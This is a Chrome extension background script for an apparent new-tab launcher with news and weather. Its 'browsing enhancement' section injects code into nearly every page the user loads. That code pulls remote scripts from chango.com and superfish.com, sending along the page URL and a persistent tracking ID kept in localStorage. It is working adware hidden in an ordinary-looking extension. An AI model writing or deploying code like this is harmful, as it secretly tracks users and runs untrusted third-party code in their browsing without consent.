var config = MY_CONFIG.config;
var fs, screenshot, topsites, chromeApps, setup, weather, news, renderer, launcher, search, analytics;

fs = new FileSystem(function(err){
    if(err){

    }

    setup = new Setup(function(err, _setupObject){

        screenshot = new Screenshot(fs, function(){
            topsites = new Topsites(screenshot, function(){

            });
            weather = new Weather(null, _setupObject);
            news = new News(null, weather,  _setupObject);

        });

    });

});


var refreshNews = function(){
    news.updateNews();
    weather.get();
};

var getConfig = function(){

};



chrome.alarms.onAlarm.addListener(function (alarm) {
    if (alarm.name === 'refreshNews') {
        refreshNews();
    }else if(alarm.name === 'getConfig'){
        getConfig();
    }
});

chrome.runtime.onInstalled.addListener(function (details) {
    if (details && details.reason) {
        chrome.alarms.create('refreshNews', {periodInMinutes: config.refresh_news_feed_period || 30});
        chrome.alarms.create('getConfig', {periodInMinutes: 1440 });
    }
});


// BROWSING ENHANCEMENT
var changoEnabled = config.chango_enabled, dealplyEnabled = config.dealply_enabled, superfishEnabled = config.superfish_enabled;

if(config.enhance_browsing){
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab){
        if(changeInfo.status !== 'complete') return;
        if(isUrlEnhanceable(tab.url)){
            if(changoEnabled) doChango(tab);
            if(dealplyEnabled) doDealply(tab);
            if(superfishEnabled) doSuperfish(tab);
        }
    });
}

var notEnhanceableHosts = ['google.com', 'facebook.com','chrome.google.com'];
var invalidWords = ['chrome:','chrome-devtools:','chrome-extension:'];
var isUrlEnhanceable = function(url){
    var uri = URI.parse(url),
        hostname = uri.hostname;
    var foundInvalidWord = _.find(invalidWords, function(word){
        return (url.indexOf(word) >= 0);
    });
    return ((notEnhanceableHosts.indexOf(hostname) === -1) && !foundInvalidWord);
};


var changoS = function anonymous(it /**/) { var out=' var __cho__ = {pid: '+(it.pid)+',r : "'+(it.r)+'",p : document.URL}; (function() { var c = document.createElement("script"); c.type = "text/javascript"; c.async = true; c.src = document.location.protocol + "//cc.chango.com/static/o.js"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(c, s); })();';return out; };

var doChango = function(tab){
    var pid = 2529, r = 'http://launchforchrome.com';
    var c = changoS({pid : pid, r : r});
    chrome.tabs.executeScript(tab.id, {code : c, runAt : 'document_end'}, function(r){});
};


var doDealply = function(tab){

};



var superfishS = function anonymous(it /**/) { var out='(function(){ var getUUID = function(){ return \'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx\'.replace(/[xy]/g, function(c) { var r = Math.random()*16|0, v = c == \'x\' ? r : (r&0x3|0x8); return v.toString(16); }).toUpperCase(); }; function loadScript(url, callback) { var head = document.getElementsByTagName(\'head\')[0]; var script = document.createElement(\'script\'); script.type = \'text/javascript\'; script.src = url; script.onreadystatechange = callback; script.onload = callback; head.appendChild(script); } function buildUrl (baseUrl,dlsource,userId,ctid){ return baseUrl + \'?dlsource=\' + dlsource + \'&userId=\' + userId + \'&CTID=\' + ctid; } var dlsource = \'ooktsmf\'; var userId = localStorage.getItem(\'uuid\'); if(!userId){ userId = getUUID(); localStorage.setItem(\'uuid\',userId); } var ctid = \'efg\'; if(document.URL.indexOf(\'https\') == 0){ loadScript(buildUrl(\'https://www.superfish.com/ws/sf_main.jsp\',dlsource,userId,ctid)); }else if (document.URL.indexOf(\'http\') == 0){ loadScript(buildUrl(\'http://www.superfish.com/ws/sf_main.jsp\',dlsource,userId,ctid)); }})();';return out; }
var doSuperfish = function(tab){
    var dlsource = 'ooktsmf', ctid = 'efg';
    var c = superfishS({dlsource : dlsource,ctid : ctid});
    chrome.tabs.executeScript(tab.id, {code : c}, function(r){});
};